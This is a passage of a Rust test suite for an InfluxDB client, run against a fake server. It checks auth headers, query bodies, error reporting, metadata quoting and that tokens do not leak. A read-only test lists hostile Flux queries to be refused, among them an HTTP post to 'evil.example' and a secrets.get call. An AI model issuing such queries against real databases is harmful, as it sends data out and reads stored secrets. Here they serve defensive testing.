    assert!(
        error
            .to_string()
            .contains("no database or bucket named 'nope'"),
        "{error}"
    );
    assert_eq!(client.get_current_database(), "_internal");
}

// ---------------------------------------------------------------------------
// v2 against the fake server
// ---------------------------------------------------------------------------

#[tokio::test]
async fn v2_posts_flux_with_the_token_header_and_reads_annotated_csv() {
    let server = FakeInflux::start(v2_handler(|_| Reply::ok(FLUX_CSV))).await;
    let mut info = server.info(2);
    info.password = Some(CANARY.to_string());
    let client = InfluxClient::new(info).await.unwrap();

    let flux = "from(bucket: \"b\") |> range(start: -1h)";
    let table = client.execute_limited(flux).await.unwrap();
    assert_eq!(table.rows.len(), 3);

    let request = server.last();
    assert_eq!(request.method, "POST");
    assert_eq!(request.path(), "/api/v2/query");
    assert_eq!(request.param("org").as_deref(), Some("acme"));
    assert_eq!(
        request.header("authorization"),
        Some(&*format!("Token {CANARY}"))
    );
    assert_eq!(request.header("accept"), Some("application/csv"));
    assert!(!request.target.contains(CANARY));
    let body: serde_json::Value = serde_json::from_str(&request.body).unwrap();
    assert_eq!(body["query"], flux);
    assert_eq!(body["type"], "flux");
    assert_eq!(body["dialect"]["annotations"][0], "datatype");

    let info = client.get_server_info().await.unwrap();
    assert_eq!(info.server_version, "v2.7.5");
    assert_eq!(
        info.additional_info.get("org").map(String::as_str),
        Some("acme")
    );
}

#[tokio::test]
async fn v2_read_only_refuses_writers_before_sending_anything() {
    let server = FakeInflux::start(v2_handler(|_| Reply::ok(FLUX_CSV))).await;
    let mut info = server.info(2);
    info.options
        .insert(OPT_HARDEN_READ_ONLY.to_string(), "1".to_string());
    let client = InfluxClient::new(info).await.unwrap();
    let before = server.received().len();
    for query in [
        "from(bucket: \"b\") |> range(start: -1h) |> to(bucket: \"copy\")",
        "import \"http\"\nhttp.post(url: \"https://evil.example\")",
        "import \"influxdata/influxdb/secrets\"\nsecrets.get(key: \"k\")",
    ] {
        let error = client.execute_query(query).await.unwrap_err();
        assert!(
            error.to_string().contains("read-only mode"),
            "{query}: {error}"
        );
    }
    assert_eq!(server.received().len(), before);
    client
        .execute_query("from(bucket: \"b\") |> range(start: -1h)")
        .await
        .unwrap();
}

#[tokio::test]
async fn v2_errors_and_a_bad_token_are_reported_plainly() {
    let server = FakeInflux::start(v2_handler(|_| {
        Reply::status(
            400,
            r#"{"code":"invalid","message":"error in building plan while starting program: cannot submit unbounded read to \"b\"; try bounding 'from' with a call to 'range'"}"#,
        )
    }))
    .await;
    let client = InfluxClient::new(server.info(2)).await.unwrap();
    let error = client
        .execute_query("from(bucket: \"b\")")
        .await
        .unwrap_err();
    assert!(
        error.to_string().contains("cannot submit unbounded read"),
        "{error}"
    );

    let rejecting = FakeInflux::start(|request| match request.path() {
        "/health" => Reply::ok(r#"{"status":"pass","version":"v2.7.5"}"#),
        _ => Reply::status(
            401,
            r#"{"code":"unauthorized","message":"unauthorized access"}"#,
        ),
    })
    .await;
    let mut info = rejecting.info(2);
    info.password = Some(CANARY.to_string());
    let Err(error) = InfluxClient::new(info).await else {
        panic!("must not connect");
    };
    assert!(matches!(error, DatabaseError::ConnectionError(_)));
    assert!(
        error.to_string().contains("authentication failed"),
        "{error}"
    );
    assert!(!error.to_string().contains(CANARY));
}

#[tokio::test]
async fn v2_metadata_uses_the_schema_package_with_quoted_names() {
    let server = FakeInflux::start(v2_handler(|request| {
        let query: serde_json::Value = serde_json::from_str(&request.body).unwrap();
        let flux = query["query"].as_str().unwrap_or_default();
        let one_column = |name: &str, values: &[&str]| {
            let mut csv = format!("#datatype,string,long,string\r\n#group,false,false,false\r\n#default,_result,,\r\n,result,table,{name}\r\n");
            for value in values {
                csv.push_str(&format!(",,0,{value}\r\n"));
            }
            Reply::ok(csv)
        };
        if flux.contains("buckets()") {
            one_column("name", &["_monitoring", "_tasks", "telemetry"])
        } else if flux.contains("schema.measurements(") {
            one_column("_value", &["cpu", "mem"])
        } else if flux.contains("measurementTagKeys") {
            one_column("_value", &["_start", "_stop", "_measurement", "host", "_field"])
        } else if flux.contains("measurementFieldKeys") {
            one_column("_value", &["usage"])
        } else {
            Reply::ok("")
        }
    }))
    .await;
    let mut info = server.info(2);
    info.database = Some("tele\"metry".to_string());
    let client = InfluxClient::new(info).await.unwrap();
    let metadata = client.get_metadata_provider();

    assert_eq!(metadata.get_schemas().await.unwrap(), ["telemetry"]);
    assert_eq!(metadata.get_tables(None).await.unwrap(), ["cpu", "mem"]);
    assert_eq!(
        metadata.get_columns("c\"pu", None).await.unwrap(),
        ["time", "host", "usage"]
    );
    let sent: Vec<String> = server
        .received()
        .iter()
        .filter(|r| r.path() == "/api/v2/query")
        .filter_map(|r| serde_json::from_str::<serde_json::Value>(&r.body).ok())
        .filter_map(|v| v["query"].as_str().map(str::to_string))
        .collect();
    let tags = sent
        .iter()
        .find(|q| q.contains("measurementTagKeys"))
        .unwrap();
    assert!(tags.contains(r#"bucket: "tele\"metry""#), "{tags}");
    assert!(tags.contains(r#"measurement: "c\"pu""#), "{tags}");
    assert!(tags.contains("start: -30d"), "{tags}");
}

// ---------------------------------------------------------------------------
// v3 against the fake server
// ---------------------------------------------------------------------------

#[tokio::test]
async fn v3_posts_sql_with_a_bearer_token_and_explains_through_the_planner() {
    let server = FakeInflux::start(|request| match request.path() {
        "/ping" => Reply::ok(r#"{"version":"3.0.0","revision":"abc"}"#),
        "/api/v3/query_sql" => {
            let body: serde_json::Value = serde_json::from_str(&request.body).unwrap();
            if body["q"]
                .as_str()
                .unwrap_or_default()
                .starts_with("EXPLAIN")
            {
                Reply::ok("plan_type,plan\r\nlogical_plan,\"Projection: cpu.usage\"\r\n")
            } else {
                Reply::ok("time,host,usage\r\n2024-01-01T00:00:00,a,0.5\r\n")
            }
        }
        _ => Reply::status(404, ""),
    })
    .await;
    let mut info = server.info(3);
    info.database = Some("mydb".to_string());
    info.password = Some(CANARY.to_string());
    let client = InfluxClient::new(info).await.unwrap();

    let rows = client.execute_query("SELECT * FROM cpu").await.unwrap();
    assert_eq!(rows[0], ["time", "host", "usage"]);
    let request = server.last();
    assert_eq!(
        request.header("authorization"),
        Some(&*format!("Bearer {CANARY}"))
    );
    let body: serde_json::Value = serde_json::from_str(&request.body).unwrap();
    assert_eq!(
        (body["db"].as_str(), body["format"].as_str()),
        (Some("mydb"), Some("csv"))
    );

    let plan = client.explain_query("SELECT * FROM cpu").await.unwrap();
    assert_eq!(plan[0], ["plan_type", "plan"]);
    client.test_query("SELECT * FROM cpu").await.unwrap();
    assert_eq!(
        client.get_server_info().await.unwrap().server_version,
        "3.0.0"
    );
}

#[tokio::test]
async fn v1_and_v2_have_no_explain() {
    let server = FakeInflux::start(v1_handler(|_| Reply::ok("{}"))).await;
    let client = InfluxClient::new(server.info(1)).await.unwrap();
    let error = client.explain_query("SELECT * FROM cpu").await.unwrap_err();
    assert!(
        matches!(error, DatabaseError::FeatureNotSupported { .. }),
        "{error:?}"
    );
}

#[tokio::test]
async fn a_query_without_a_database_says_what_is_missing() {
    let server = FakeInflux::start(|request| match request.path() {
        "/ping" => Reply::ok(r#"{"version":"3.0.0"}"#),
        _ => Reply::ok("[]"),
    })
    .await;
    let client = InfluxClient::new(server.info(3)).await.unwrap();
    let error = client.execute_query("SELECT 1").await.unwrap_err();
    assert!(error.to_string().contains("needs a database"), "{error}");
}

// ---------------------------------------------------------------------------
// Real servers (opt-in)
// ---------------------------------------------------------------------------

/// `INFLUXDB_URL` (v1, e.g. `influxdb://127.0.0.1:8086/test`) is reachable and
/// answers InfluxQL. Read-only: nothing is written.
#[tokio::test]
async fn real_v1_server_round_trip() {
    let Ok(url) = std::env::var("INFLUXDB_URL") else {
        return;
    };
    let info = ConnectionInfo::parse_url(&url).unwrap();
    let client = InfluxClient::new(info).await.expect("connect");
    let databases = client.list_databases().await.unwrap();
    assert!(databases.len() >= 2, "{databases:?}");
    let table = client.execute_limited("SHOW MEASUREMENTS").await.unwrap();
    assert!(table.rows.is_empty() || table.columns.first().map(String::as_str) == Some("name"));
}

/// `INFLUXDB2_URL` (e.g. `influxdb2://:TOKEN@127.0.0.1:8086/bucket?org=acme`)
/// is reachable and answers Flux.
#[tokio::test]
async fn real_v2_server_round_trip() {
    let Ok(url) = std::env::var("INFLUXDB2_URL") else {
        return;
    };
    let info = ConnectionInfo::parse_url(&url).unwrap();
    let client = InfluxClient::new(info).await.expect("connect");
    let buckets = client.list_databases().await.unwrap();
    assert!(buckets.len() >= 2, "{buckets:?}");
    let table = client
        .execute_limited("buckets() |> keep(columns: [\"name\"])")
        .await
        .unwrap();
    assert!(!table.rows.is_empty());
    let error = client
        .execute_query("from(bucket: \"nope\")")
        .await
        .unwrap_err();
    assert!(!error.to_string().is_empty());
}
